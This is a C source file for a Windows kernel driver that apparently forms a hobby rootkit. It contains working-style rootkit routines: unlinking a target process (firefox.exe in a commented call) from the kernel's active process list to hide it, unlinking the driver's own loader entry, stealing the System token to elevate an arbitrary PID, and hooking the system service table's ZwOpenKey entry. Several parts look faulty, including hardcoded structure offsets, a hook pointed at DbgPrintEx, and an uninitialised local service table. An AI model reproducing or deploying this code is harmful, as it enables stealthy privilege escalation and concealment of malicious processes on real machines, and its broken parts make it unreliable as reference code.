#include "Driver.h"





void OnUnload(IN PDRIVER_OBJECT DriverObject) {
    DbgPrintEx(0, 0, "Bye Bye !!!\n");
}
//https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ps/eprocess/index.htm
// 
//Windows ActiveProcessLinks offset:0x448
//Windows Flink offset:0x0
//Windows Blink offset:0x8

int GetImageFileNameOffset(char* name) {
    PEPROCESS currentproc = PsGetCurrentProcess();
    for (int i = 0; i < PAGE_SIZE; i++)
    {

        if (strncmp(name, (char*)currentproc + i, strlen(name))==0){
            return i;
        }
    }
    DbgPrintEx(0, 0, "Process not found...\n");
    return -1;
}
int SearchAndRemoveEPROCESSbyOffset(int offset, char *target) {
    PEPROCESS currentproc = PsGetCurrentProcess();
    DbgPrintEx(0, 0, "ImageFileName: %s\n", (unsigned char*)((unsigned char*)currentproc + offset));
    PLIST_ENTRY listentry = (LIST_ENTRY*)((unsigned char*)currentproc+0x448);
    listentry = listentry->Flink;
    PEPROCESS process = (PEPROCESS)((unsigned char*)listentry - 0x448);//getting EPROCESS from LIST_ENTRY
    char *name = (char*)((unsigned char*)process + offset);

    while (strcmp(name, "System") != 0){
        
        process = (PEPROCESS)((unsigned char*)listentry - 0x448);//getting EPROCESS from LIST_ENTRY
        name = (char*)((unsigned char*)process + offset);
        DbgPrintEx(0, 0, "Process name: %s\n", name);
        listentry = listentry->Flink;
        if (strcmp(name, target) == 0) {
            int pid = *(int*)((unsigned char*)process + 0x440);
            HideProcess(pid);
            //*(int*)((unsigned char*)process + 0x440) = 0xffffcafe;//is this illegal ?
            DbgPrintEx(0, 0, "PID : %d\n", pid);
        }
    }

    return -1;
}
int HideProcess(int targetPID) {
    PEPROCESS pidEPROCESS;
    NTSTATUS result = PsLookupProcessByProcessId((HANDLE)targetPID,&pidEPROCESS);
    
    if (result == STATUS_INVALID_PARAMETER) {
        DbgPrint("An invalid parameter was passed to a service or function. (PID not found) (0xC000000D)");
        return -1;
    }
    else if (result == STATUS_INVALID_CID) {
        DbgPrint("An invalid client ID was specified. (0x0xC000000B)");
        return -1;
    }
    if (result != STATUS_SUCCESS) {
        DbgPrint("Unknow PsLookupProcessByProcessId error !!!");
    }
    PLIST_ENTRY ActiveProcessLinks;
    ActiveProcessLinks = (PLIST_ENTRY)((unsigned char *)pidEPROCESS + 0x448);
    ActiveProcessLinks->Flink->Blink = ActiveProcessLinks->Blink;
    ActiveProcessLinks->Blink->Flink = ActiveProcessLinks->Flink;
    ActiveProcessLinks->Flink = NULL;
    ActiveProcessLinks->Blink = NULL;

    //now hiding the process
    DbgPrint("Process is now hidden..."); 
    return 1;
}

int HideDriverSection(PDRIVER_OBJECT DriverObject) {
    PVOID DriverSection = DriverObject->DriverSection;
    PLDR_DATA_TABLE_ENTRY TableEntry  = (PLDR_DATA_TABLE_ENTRY)DriverSection;
    DbgPrintEx(0, 0, "DriverSection: %p\n", DriverSection);
    PLIST_ENTRY InLoadOrderLinks_ = (PLIST_ENTRY)((unsigned char*)TableEntry + 0);//current offset of InLoadOrderLinks
    PUNICODE_STRING FullDllName = (UNICODE_STRING*)((unsigned char*)InLoadOrderLinks_ + 0x48);
    DbgPrintEx(0, 0, "InLoadOrderLinks FullDllName: %ls\n", FullDllName->Buffer);
    PLDR_DATA_TABLE_ENTRY PrevEntry = (PLDR_DATA_TABLE_ENTRY)TableEntry->InLoadOrderLinks.Blink;
    PLDR_DATA_TABLE_ENTRY NextEntry = (PLDR_DATA_TABLE_ENTRY)TableEntry->InLoadOrderLinks.Flink;
    PrevEntry->InLoadOrderLinks.Flink = TableEntry->InLoadOrderLinks.Flink;
    NextEntry->InLoadOrderLinks.Blink = TableEntry->InLoadOrderLinks.Blink;
    TableEntry->InLoadOrderLinks.Flink = NULL;
    TableEntry->InLoadOrderLinks.Blink = NULL;
    DbgPrintEx(0, 0, "Driver should be hidden\n");
    return 1;
}

int ElevateSpecificPID(int targetPID) {
    PEPROCESS currentproc = PsGetCurrentProcess();//System
    PEX_FAST_REF Token = (PEX_FAST_REF)((unsigned char*)currentproc + 0x4B8);//Token offset
    PEPROCESS pidEPROCESS;
    NTSTATUS result = PsLookupProcessByProcessId((HANDLE)targetPID, &pidEPROCESS);

    if (result == STATUS_INVALID_PARAMETER) {
        DbgPrint("An invalid parameter was passed to a service or function. (PID not found) (0xC000000D)");
        return -1;
    }
    else if (result == STATUS_INVALID_CID) {
        DbgPrint("An invalid client ID was specified. (0x0xC000000B)");
        return -1;
    }
    if (result != STATUS_SUCCESS) {
        DbgPrint("Unknow PsLookupProcessByProcessId error !!!");
    }
    memcpy(((unsigned char*)pidEPROCESS + 0x4B8), Token, sizeof(PEX_FAST_REF));//normalement ça passe
    //du 1er coup si ça c'est pas beau
    return 0;
}


//https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/index.htm


typedef struct ServiceDescriptorEntry {
    unsigned int* ServiceTableBase;
    unsigned int* ServiceCounterTableBase; //Used only in checked build
    unsigned int NumberOfServices;
    unsigned char* ParamTableBase;
} ServiceDescriptorTableEntry_t, * PServiceDescriptorTableEntry_t;





LARGE_INTEGER					m_UserTime;
LARGE_INTEGER					m_KernelTime;

typedef NTSYSAPI(*ZWOPENKEY)(
    PHANDLE KeyHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes
    );
PMDL  g_pmdlSystemCall; // *MDL
PVOID* MappedSystemCallTable;
ZWOPENKEY OldregOpenKey;

ServiceDescriptorTableEntry_t KeServiceDescriptorTable;
#define SYSTEMSERVICE(_function)  KeServiceDescriptorTable.ServiceTableBase[ *(PULONG)((PUCHAR)_function+1)] //prends une adresse éxportée par ntosrknl et renvoie l'adresse de la fonction exportée par la ssdt
#define SYSCALL_INDEX(_Function) *(PULONG)((PUCHAR)_Function+1)
#define HOOK_SYSCALL(_Function, _Hook, _Orig )  _Orig = (PVOID) InterlockedExchange( (PLONG) &MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG) _Hook)

#define UNHOOK_SYSCALL(_Function, _Hook, _Orig ) InterlockedExchange( (PLONG) &MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG) _Hook)





NTSTATUS NewZwOpenKey(PHANDLE KeyHandle,ACCESS_MASK DesiredAccess,POBJECT_ATTRIBUTES ObjectAttributes) {
    DbgPrintEx(0, 0, "OpenKey hook !\n");
    NTSTATUS Status;
    Status = OldregOpenKey(KeyHandle, DesiredAccess, ObjectAttributes);
    return Status;
}
int tryHook() {
    m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;//Initialise les variables de temps global à 0 et les syncro
    OldregOpenKey = (ZWOPENKEY)(SYSTEMSERVICE(ZwOpenKey));
    //Memory Descriptor List, alloue de la mémoire dans la nonpagedpool, avec les droits d'écriture (pour corrompre la SSDT)
    g_pmdlSystemCall = MmCreateMdl(NULL, KeServiceDescriptorTable.ServiceTableBase, KeServiceDescriptorTable.NumberOfServices * 4);
    if (!g_pmdlSystemCall) {
        return STATUS_UNSUCCESSFUL;
    }
    //https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-mmbuildmdlfornonpagedpool
    MmBuildMdlForNonPagedPool(g_pmdlSystemCall);

    // Change l'autorisation de la page map
    g_pmdlSystemCall->MdlFlags |= MDL_MAPPED_TO_SYSTEM_VA;
    MmMapLockedPagesSpecifyCache(g_pmdlSystemCall, KernelMode, MmNonCached/*on prend pas de risques*/, NULL, FALSE, 0);
    HOOK_SYSCALL(ZwOpenKey,DbgPrintEx, OldregOpenKey);
    return 1;
}
NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject,_In_ PUNICODE_STRING RegistryPath){
    // NTSTATUS variable to record success or failure
    DbgPrintEx(0, 0, "Hey from kernel ! now testing...\n");
    DriverObject->DriverUnload = OnUnload;
    tryHook();
    //SearchAndRemoveEPROCESSbyOffset(GetImageFileNameOffset("System"), "firefox.exe");
    //HideDriverSection(DriverObject);
    return STATUS_SUCCESS;
}